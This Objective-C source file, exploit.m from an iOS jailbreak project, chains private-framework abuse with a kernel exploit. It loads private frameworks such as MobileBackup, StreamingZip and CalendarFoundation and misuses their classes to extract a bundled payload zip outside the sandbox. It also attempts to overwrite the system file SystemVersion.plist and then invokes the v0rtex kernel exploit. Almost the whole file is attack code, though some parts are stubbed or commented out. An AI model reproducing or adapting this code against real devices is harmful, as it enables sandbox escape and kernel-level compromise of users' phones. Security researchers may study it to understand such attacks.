//
//  exploit.m
//  amfetamine
//
//  Created by Sem Voigtländer on 30/11/2017.
//  Copyright © 2017 Sem Voigtländer. All rights reserved.
//

#import "v0rtex.h"
#import "PrivateAPIManager.h"
#import "exploit.h"
#import "ViewController.h"
#import <mach/mach.h>
#import <Foundation/Foundation.h>
@interface fake : NSObject
@end
@implementation fake
NSString* writeableDocsDir;
Class MBFileManager;
Class MSVZipArchive;
Class SZExtractor;
Class StreamingUnzipper;
Class StreamingUnzipState;
Class CalLogFileWriter;

id MBFileManagerInstance; //From MobileBackup
id MSVZipArchiveInstance; //From MediaServices
id SZExtractorInstance; //From StreamingZip
id StreamingUnzipperInstance; //From StreamingZip
id StreamingUnzipStateInstance; //From StreamingZip
id CalLogFileWriterInstance; //From CalendarFoundation
id inProcessUnzipper; //From StreamingZip

BOOL classSuccess = false;
BOOL symbolSuccess = false;
BOOL instanceSuccess = false;


BOOL setupPrivateAPIS() {
    if(![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/MobileBackup.framework"]) {
        return false;
    } else if (![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/MediaServices.framework"]) {
        return false;
    } else if (![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/StreamingZip.framework"]){
        return false;
    } else if (![PrivateAPI loadPrivateAPIWithPath:@"/System/Library/PrivateFrameworks/CalendarFoundation.framework"]){
        return false;
    }
    classSuccess = true;
    return true;
}

BOOL setupClassSymbols() {
    
    if(!classSuccess) { return false; }
    
    MBFileManager = NSClassFromString(@"MBFileManager"); //From MobileBackup
    MSVZipArchive = NSClassFromString(@"MSVZipArchive"); //From MediaServices
    SZExtractor = NSClassFromString(@"SZExtractor"); //From StreamingZip
    StreamingUnzipper = NSClassFromString(@"StreamingUnzipper"); //From StreamingZip
    StreamingUnzipState = NSClassFromString(@"StreamingUnzipState"); //From StreamingZip
    CalLogFileWriter = NSClassFromString(@"CalLogFileWriter"); //From CalendarFoundation
    
    if(MBFileManager == nil) {
        return false;
    }
    
    if(MSVZipArchive == nil) {
        return false;
    }
    
    if(SZExtractor == nil) {
        return false;
    }
    
    if(StreamingUnzipper == nil) {
        return false;
    }
    
    if(StreamingUnzipState == nil) {
        return false;
    }
    
    if(CalLogFileWriter == nil) {
        return false;
    }
    [StreamingUnzipper retain];
    [SZExtractor retain];
    [CalLogFileWriter retain];
    [MSVZipArchive retain];
    [MBFileManager retain];
    symbolSuccess = true;
    return true;
}

BOOL setupClassInstances() {
    
    if(!symbolSuccess) { return false; }

    MBFileManagerInstance  = [MBFileManager alloc];
    MSVZipArchiveInstance = [MSVZipArchive alloc];
    SZExtractorInstance = [SZExtractor alloc];
    StreamingUnzipperInstance = [StreamingUnzipper alloc];
    StreamingUnzipStateInstance = [StreamingUnzipState alloc];
    CalLogFileWriterInstance = [CalLogFileWriter alloc];
    
    if(MBFileManagerInstance == nil) {
        return false;
    }
    if(MSVZipArchiveInstance == nil) {
        return false;
    }
    if(SZExtractorInstance == nil) {
        return false;
    }
    if(StreamingUnzipperInstance == nil) {
        return false;
    }
    if(StreamingUnzipStateInstance == nil) {
        return false;
    }
    if(CalLogFileWriterInstance == nil) {
        return false;
    }
    instanceSuccess = true;
    return true;
}

NSString* getSystemVersionPlist() {
    NSString* contents = [NSString stringWithContentsOfFile:@"/System/Library/CoreServices/SystemVersion.plist"];
    return contents;
}

NSString* do_exploit() {
    if(!setupPrivateAPIS()) {
        return @"API Load failed";
    }
    if(!setupClassSymbols()) {
        return @"Symbolisation failed";
    }
    if(!setupClassInstances()) {
        return @"Instanciation failed";
    }
    
    writeableDocsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];
    
    NSString* payloadPath = [[NSBundle mainBundle] pathForResource:@"data" ofType:@"zip"];
    NSData* payloadBytes = [NSData dataWithContentsOfFile:payloadPath];
    if(payloadBytes.length <= 0) {
        return @"Payload is null";
    }
    NSArray *payloadSHA1Hash = [NSArray arrayWithObjects:@"4ec0350e1ea45f8a5236373913913f70ae8050db", nil];
    NSString* payloadExtractionPath = @"/tmp";
    
    NSString* coreservicesPath = @"/System/Library/CoreServices/";
    NSArray* coreservicesContents = [MBFileManagerInstance directoryContentsAtPath:coreservicesPath];
    NSString* systemversionPatch = @"\
    <key>ProductVersion</key>\n\
    <string>8.4.1</string>\n\
    <key>Exploit Author</key>\n\
    <string>Sem Voigtlander</string>\n";
    
    /* Extract zip with MSVZipArchive */
    if(MSVZipExtract(payloadPath, payloadExtractionPath)) {
        
    } else if (MSVZipExtract(payloadPath, writeableDocsDir)) {
        NSArray* contents = [MBFileManagerInstance directoryContentsAtPath:writeableDocsDir];
        for(int i = 0; i < contents.count; i++) {
            printf("\t- %s\n", [contents[i] UTF8String]);
        }
        printf("\n");
    } else {
        return @"MSVZipExtract failed";
    }
    
    /* Writing to SystemVersion */
    if(CalLogWriterWrite([coreservicesPath stringByAppendingString:@"SystemVersion.plist"], systemversionPatch)) {
        
    } else {
        printf("SystemVersion.plist:\n%s\n\n",[getSystemVersionPlist() UTF8String]);
        //return @"CalLogWriter failed";
    }
    
    /* Extract zip with StreamingZip */
    /*if(!StreamingZipExtract(nil, payloadSHA1Hash, payloadBytes, payloadExtractionPath)) {
        return @"StreamingZip failed";
    }*/
    
    /* Kernel exploit */
    if(v0rtex() != KERN_SUCCESS) {
        return @"Failed kernel exploitation!";
    }
    return @"Success!";
}

BOOL MSVZipExtract(NSString* archive, NSString* outputPath) {
    [MSVZipArchiveInstance setValue:archive forKey:@"_archivePath"];
    NSError *extractionError = nil;
    [MSVZipArchiveInstance decompressToPath:outputPath withError:&extractionError];
    if(extractionError != nil) {
        return false;
    } else {
        return true;
    }
}

BOOL StreamingZipExtract(char* sandboxToken, NSArray* archiveHashes, NSData* archiveBytes, NSString* outputPath) {
    [SZExtractor enableDebugLogging];
    id delegate = [SZExtractorInstance valueForKey:@"delegate"];
    id delegateInstance = [delegate alloc];
    [delegate enableDebugLogging];
    [delegateInstance initForLocalExtractionWithPath:outputPath options:@{}];
    [SZExtractorInstance setValue:StreamingUnzipperInstance forKey:@"_inProcessUnzipper"];
    inProcessUnzipper = [SZExtractorInstance valueForKey:@"_inProcessUnzipper"];
    if(inProcessUnzipper == nil) {
        
    }
    
    //It seems we can remove any arbitrary file from /tmp. Hooray!
    [StreamingUnzipState unzipStateWithPath:@"/tmp" options:nil error:nil];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithBool:true] forKey:@"_storeCurrentFileInMemory"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithInteger:0] forKey:@"_thisStageBytesComplete"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithInteger:0] forKey:@"_totalFileSizeWritten"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithInteger:0] forKey:@"_totalRecordCount"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithInteger:0] forKey:@"_totalUncompressedBytes"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithInteger:0] forKey:@"_uncompressedBytesOutput"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithBool:false] forKey:@"_denyInvalidSymlinks"];
    //[StreamingUnzipStateInstance setValue:archiveBytes forKey:@"_inMemoryFileData"];
    //[StreamingUnzipStateInstance setValue:archiveHashes forKey:@"_hashes"];
    [StreamingUnzipStateInstance setValue:outputPath forKey:@"_unzipPath"];
    //[StreamingUnzipStateInstance setValue:archiveBytes forKey:@"_unsureData"];
    //[StreamingUnzipStateInstance setValue:[NSNumber numberWithInt:0] forKey:@"_currentLFRecord"];
    [inProcessUnzipper setValue:StreamingUnzipStateInstance forKey:@"_currentState"];
    [delegateInstance setValue:StreamingUnzipperInstance forKey:@"_currentState"];
    [delegateInstance supplyBytes:archiveBytes withCompletionBlock:^(void){
        
    }];
    [inProcessUnzipper supplyBytes:archiveBytes withReply:^(void){
        
    }];
 
    [inProcessUnzipper setupUnzipperWithOutputPath:outputPath sandboxExtensionToken:sandboxToken options:@{} withReply:^(NSError* e){
        if(e != nil) {
            return false;
        }
        return true;
    }];
    
    [StreamingUnzipper release];
    [StreamingUnzipperInstance dealloc];
    [SZExtractor release];
    [SZExtractorInstance dealloc];
    [CalLogFileWriterInstance dealloc];
    [CalLogFileWriter release];
    [MSVZipArchiveInstance dealloc];
    [MSVZipArchive release];
    [MBFileManagerInstance dealloc];
    [MBFileManager release];
    
    classSuccess = false;
    symbolSuccess = false;
    instanceSuccess = false;
    return true;
}


BOOL CalLogWriterWrite(NSString* file, NSString* value) {
    [CalLogFileWriterInstance setValue:file forKey:@"_path"];
    [CalLogFileWriterInstance setValue:[NSNumber numberWithBool:true] forKey:@"_fileDescriptorIsValid"];
    NSString* contents = [NSString stringWithContentsOfFile:file];
    return [contents containsString:value];
}

- (void) initForLocalExtractionWithPath:(NSString*)path options:(id)options {
    
}

- (void) supplyBytes:archiveBytes withCompletionBlock:(id)completionBlock {
    
}
- (void) supplyBytes:archiveBytes withReply:(id)reply {
    
}

- (void) unzipStateWithPath:outputPath options:(id)options error:(NSError*)error {
    
}

- (void) setupUnzipperWithOutputPath:(NSString*)path sandboxExtensionToken:(char*)token options:(id)options withReply:(id)reply {
    
}

- (void) enableDebugLogging {
    
}
- (void) decompressToPath:(NSString*)outputPath withError:(id*)error{
    
}
@end

